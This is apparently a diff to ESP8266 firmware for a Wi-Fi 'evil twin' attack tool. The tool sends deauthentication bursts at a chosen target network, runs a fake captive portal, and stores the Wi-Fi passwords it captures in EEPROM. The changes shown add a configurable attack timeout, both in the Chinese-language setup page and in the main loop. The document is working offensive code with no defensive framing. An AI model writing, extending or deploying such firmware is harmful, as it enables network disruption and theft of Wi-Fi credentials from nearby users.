@@ -17,8 +17,9 @@
    History: HeadIndex(1) + 10 * PWD(64) = 641 B. Total = 681 B
    Setup Pwd: 64 B. Offset = 681
    Setup SSID: 33 B. Offset = 745
-   History SSID: 10 * SSID(33) = 330 B. Offset = 778 */
-enum { EE_BSSID = 0, EE_SSID = 6, EE_CH = 39, EE_PWD_HEAD = 40, EE_PWD_DATA = 41, EE_SETUP_PWD = 681, EE_SETUP_SSID = 745, EE_PWD_SSID_DATA = 778 };
+   History SSID: 10 * SSID(33) = 330 B. Offset = 778
+   Attack Timeout: 1 B. Offset = 1108 */
+enum { EE_BSSID = 0, EE_SSID = 6, EE_CH = 39, EE_PWD_HEAD = 40, EE_PWD_DATA = 41, EE_SETUP_PWD = 681, EE_SETUP_SSID = 745, EE_PWD_SSID_DATA = 778, EE_ATTACK_TIMEOUT = 1108 };
 
 /* ================================================================== */
 IPAddress           apIP(192, 168, 4, 1);
@@ -29,6 +30,8 @@ static uint8_t      targetBSSID[6];
 static char         targetSSID[33];
 static uint8_t      targetChannel = 6;
 static bool         attacking;
+static unsigned long attackStartMs;
+static uint8_t      attackTimeoutMins = 15;    /* 0 means infinite */
 static bool         capturedFlag;              /* password was captured     */
 static unsigned long capturedMs;
 static char         pwdHistory[PWD_MAX_HISTORY][PWD_MAX_LEN + 1]; /* all passwords */
@@ -211,7 +214,7 @@ static void loadPwd(void)
     EEPROM.end();
 }
 
-static void saveSetupConfig(const char *ssid, const char *pwd)
+static void saveSetupConfig(const char *ssid, const char *pwd, uint8_t timeout)
 {
     EEPROM.begin(EE_SIZE);
     int lenPwd = strlen(pwd);
@@ -224,13 +227,16 @@ static void saveSetupConfig(const char *ssid, const char *pwd)
     for (int i = 0; i < lenSSID; i++) EEPROM.write(EE_SETUP_SSID + i, (uint8_t)ssid[i]);
     for (int i = lenSSID; i < 33; i++) EEPROM.write(EE_SETUP_SSID + i, 0x00);
 
+    EEPROM.write(EE_ATTACK_TIMEOUT, timeout);
+
     EEPROM.commit();
     EEPROM.end();
     strncpy(setupPwd, pwd, PWD_MAX_LEN);
     setupPwd[PWD_MAX_LEN] = '\0';
     strncpy(setupSSID, ssid, 32);
     setupSSID[32] = '\0';
-    Serial.printf("saveSetupConfig: saved SSID=%s PWD=%s\n", setupSSID, setupPwd);
+    attackTimeoutMins = timeout;
+    Serial.printf("saveSetupConfig: saved SSID=%s PWD=%s TIMEOUT=%d\n", setupSSID, setupPwd, timeout);
 }
 
 static void loadSetupConfig(void)
@@ -243,6 +249,11 @@ static void loadSetupConfig(void)
     char tmpS[33];
     for (int i = 0; i < 33; i++) tmpS[i] = (char)EEPROM.read(EE_SETUP_SSID + i);
     tmpS[32] = '\0';
+    
+    uint8_t t = EEPROM.read(EE_ATTACK_TIMEOUT);
+    if (t != 0xFF) attackTimeoutMins = t;
+    else attackTimeoutMins = 15;
+    
     EEPROM.end();
     
     if ((uint8_t)tmpP[0] != 0xFF && tmpP[0] != '\0') {
@@ -588,6 +599,10 @@ static void onConfigRoot(void)
     html += F("' style='padding:8px 12px;border:1px solid #ccc;border-radius:6px;font-size:14px;width:100%;box-sizing:border-box;margin-bottom:10px;'>"
              "<input type='text' name='newpwd' placeholder='新密码 (至少8位)' required minlength='8' "
              "style='padding:8px 12px;border:1px solid #ccc;border-radius:6px;font-size:14px;width:100%;box-sizing:border-box;margin-bottom:10px;'>"
+             "<div style='text-align:left;font-size:13px;color:#666;margin-bottom:4px;padding-left:4px;'>放弃攻击超时时间 (0为永不放弃)</div>"
+             "<input type='number' name='timeout' placeholder='超时分钟数' required min='0' max='255' value='");
+    html += String(attackTimeoutMins);
+    html += F("' style='padding:8px 12px;border:1px solid #ccc;border-radius:6px;font-size:14px;width:100%;box-sizing:border-box;margin-bottom:10px;'>"
              "<button type='submit' style='padding:8px 16px;background:#e63946;color:#fff;border:none;border-radius:6px;cursor:pointer;width:100%;font-weight:bold;'>保存并重启</button>"
              "</form></div>"
              "</body></html>");
@@ -699,11 +714,12 @@ static void enterConfigMode(void)
     server.on("/rescan", HTTP_GET,  onConfigRescan);
     server.on("/select", HTTP_POST, onConfigSelect);
     server.on("/change_setup", HTTP_POST, []() {
-        if (server.hasArg("newpwd") && server.hasArg("newssid")) {
+        if (server.hasArg("newpwd") && server.hasArg("newssid") && server.hasArg("timeout")) {
             String newpwd = server.arg("newpwd");
             String newssid = server.arg("newssid");
+            uint8_t timeout = server.arg("timeout").toInt();
             if (newpwd.length() >= 8 && newssid.length() > 0) {
-                saveSetupConfig(newssid.c_str(), newpwd.c_str());
+                saveSetupConfig(newssid.c_str(), newpwd.c_str(), timeout);
                 server.send(200, "text/html; charset=utf-8", 
                     F("<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
                       "<div style='text-align:center;font-family:sans-serif;margin-top:50px;'>"
@@ -761,6 +777,7 @@ static void enterAttackMode(void)
     server.begin();
 
     attacking = true;
+    attackStartMs = millis();
     Serial.println("Deauth + captive portal active.");
 }
 
@@ -788,6 +805,13 @@ void loop(void)
             lastDeauthMs = now;
             wifi_set_channel(targetChannel);
             sendDeauthBurst();
+        }
+        
+        if (attackTimeoutMins > 0 && (now - attackStartMs >= (unsigned long)attackTimeoutMins * 60000)) {
+            Serial.println("Attack timeout reached! Stopping attack...");
+            clearConfig();
+            delay(200);
+            ESP.restart();
         }
     }
 
